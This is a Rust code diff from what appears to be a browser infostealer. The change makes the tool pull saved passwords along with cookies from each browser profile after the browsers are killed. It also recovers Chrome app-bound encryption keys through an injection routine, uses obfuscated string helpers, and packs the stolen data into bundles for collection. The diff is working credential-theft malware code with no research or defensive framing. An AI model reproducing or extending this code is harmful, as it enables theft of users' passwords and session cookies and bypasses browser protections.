@@ -67,8 +67,10 @@ fn cache_browser(browser_name: &str, user_data_path: &Path, has_profiles: bool, 
     }
 }
 
-/// Re-extract cookies after all browsers are killed (DB unlocked).
-pub fn extract_cookies_post_kill() -> Vec<(String, String)> {
+/// Re-extract cookies/passwords after kill; run inject only here (not during parallel scan).
+pub fn extract_post_kill() -> Vec<(String, String)> {
+    recover_missing_app_bound_keys();
+
     let cache = match EXTRACTION_CACHE.lock() {
         Ok(guard) => guard.clone(),
         Err(_) => return Vec::new(),
@@ -79,23 +81,63 @@ pub fn extract_cookies_post_kill() -> Vec<(String, String)> {
     for (browser_name, cached) in cache {
         let profiles = get_profiles(&cached.user_data_path, cached.has_profiles);
         for (profile_name, profile_path) in profiles {
-            if let Some(cookies) = extract_cookies(&profile_path, &cached.keys) {
-                crate::browsers::common::zipp::push_profile_bundle(
-                    &mut results,
-                    &browser_name,
-                    &profile_name,
-                    None,
-                    Some(cookies),
-                    None,
-                    None,
-                );
-            }
+            let passwords = extract_passwords(&profile_path, &cached.keys);
+            let cookies = extract_cookies(&profile_path, &cached.keys);
+            crate::browsers::common::zipp::push_profile_bundle(
+                &mut results,
+                &browser_name,
+                &profile_name,
+                passwords,
+                cookies,
+                None,
+                None,
+            );
         }
     }
     results
 }
 
-fn fetch_app_bound(browser_name: &str, json: &Value, has_app_bound: bool) -> Option<Vec<u8>> {
+fn recover_missing_app_bound_keys() {
+    let Ok(mut guard) = EXTRACTION_CACHE.lock() else { return };
+    let Some(map) = guard.as_mut() else { return };
+
+    let pending: Vec<String> = map
+        .iter()
+        .filter(|(_, c)| c.keys.app_bound.is_none())
+        .map(|(name, _)| name.clone())
+        .collect();
+
+    for browser_name in pending {
+        let Some(cached) = map.get(&browser_name) else { continue };
+        let local_state = cached.user_data_path.join(s_local_state());
+        let Ok(content) = fs::read_to_string(&local_state) else { continue };
+        let Ok(json) = serde_json::from_str::<Value>(&content) else { continue };
+
+        let os_crypt = s_os_crypt();
+        let app_bound_key = s_app_bound_encrypted_key();
+        if json[&os_crypt][&app_bound_key].as_str().is_none() {
+            continue;
+        }
+
+        if let Some(k) = fetch_app_bound(&browser_name, &json, true, true) {
+            if let Some(entry) = map.get_mut(&browser_name) {
+                entry.keys.app_bound = Some(k);
+            }
+        }
+    }
+}
+
+/// Re-extract cookies after all browsers are killed (DB unlocked).
+pub fn extract_cookies_post_kill() -> Vec<(String, String)> {
+    extract_post_kill()
+}
+
+fn fetch_app_bound(
+    browser_name: &str,
+    json: &Value,
+    has_app_bound: bool,
+    allow_inject: bool,
+) -> Option<Vec<u8>> {
     if !has_app_bound {
         return None;
     }
@@ -111,15 +153,17 @@ fn fetch_app_bound(browser_name: &str, json: &Value, has_app_bound: bool) -> Opt
             }
         }
     }
-    if let Some(k) = crate::browsers::common::ci::fetch_app_bound_key(browser_name) {
-        if k.len() == 32 {
-            return Some(k);
+    if allow_inject {
+        if let Some(k) = crate::browsers::common::ci::fetch_app_bound_key(browser_name) {
+            if k.len() == 32 {
+                return Some(k);
+            }
         }
     }
     None
 }
 
-pub fn get_master_keys(user_data_path: &Path, browser_name: &str) -> Option<MasterKeys> {
+pub fn get_master_keys(user_data_path: &Path, browser_name: &str, allow_inject: bool) -> Option<MasterKeys> {
     let local_state = user_data_path.join(s_local_state());
     let content = fs::read_to_string(&local_state).ok()?;
     let json: Value = serde_json::from_str(&content).ok()?;
@@ -139,7 +183,7 @@ pub fn get_master_keys(user_data_path: &Path, browser_name: &str) -> Option<Mast
 
     if let Some(ref s) = standard_wrapped {
         if s.len() == 32 {
-            let app_bound = fetch_app_bound(browser_name, &json, has_app_bound);
+            let app_bound = fetch_app_bound(browser_name, &json, has_app_bound, allow_inject);
             return Some(MasterKeys { standard: s.clone(), app_bound });
         }
     }
@@ -159,7 +203,7 @@ pub fn get_master_keys(user_data_path: &Path, browser_name: &str) -> Option<Mast
     }
 
     if has_app_bound {
-        if let Some(k) = fetch_app_bound(browser_name, &json, true) {
+        if let Some(k) = fetch_app_bound(browser_name, &json, true, allow_inject) {
             let standard = standard_wrapped.clone().unwrap_or_default();
             return Some(MasterKeys { standard, app_bound: Some(k) });
         }
@@ -373,28 +417,28 @@ pub fn copy_db(db_path: &Path) -> Option<PathBuf> {
 }
 
 pub fn open_db_robust(db_path: &Path) -> Option<(Connection, Option<PathBuf>)> {
-    for attempt in 0..5 {
+    for attempt in 0..3 {
         if let Some(temp) = copy_db(db_path) {
             match std::panic::catch_unwind(std::panic::AssertUnwindSafe(|| Connection::open(&temp))) {
                 Ok(Ok(c)) => return Some((c, Some(temp))),
                 Ok(Err(_)) => {
                     cleanup_db(&temp);
-                    if attempt < 4 {
-                        std::thread::sleep(std::time::Duration::from_millis(1000 * (attempt + 1) as u64));
+                    if attempt < 2 {
+                        std::thread::sleep(std::time::Duration::from_millis(300 * (attempt + 1) as u64));
                     }
                     continue;
                 }
                 Err(_) => {
                     cleanup_db(&temp);
-                    if attempt < 4 {
-                        std::thread::sleep(std::time::Duration::from_millis(1000 * (attempt + 1) as u64));
+                    if attempt < 2 {
+                        std::thread::sleep(std::time::Duration::from_millis(300 * (attempt + 1) as u64));
                     }
                     continue;
                 }
             }
         }
-        if attempt < 4 {
-            std::thread::sleep(std::time::Duration::from_millis(1000 * (attempt + 1) as u64));
+        if attempt < 2 {
+            std::thread::sleep(std::time::Duration::from_millis(300 * (attempt + 1) as u64));
         }
     }
     match std::panic::catch_unwind(std::panic::AssertUnwindSafe(|| {
@@ -679,7 +723,7 @@ pub fn extract_for_browser(browser_name: &str, user_data_path: &Path, has_profil
         return results;
     }
     let pids_before = crate::core::kill::snapshot_browser_pids();
-    let keys = get_master_keys(user_data_path, browser_name);
+    let keys = get_master_keys(user_data_path, browser_name, false);
     if let Some(ref k) = keys {
         cache_browser(browser_name, user_data_path, has_profiles, k);
     }
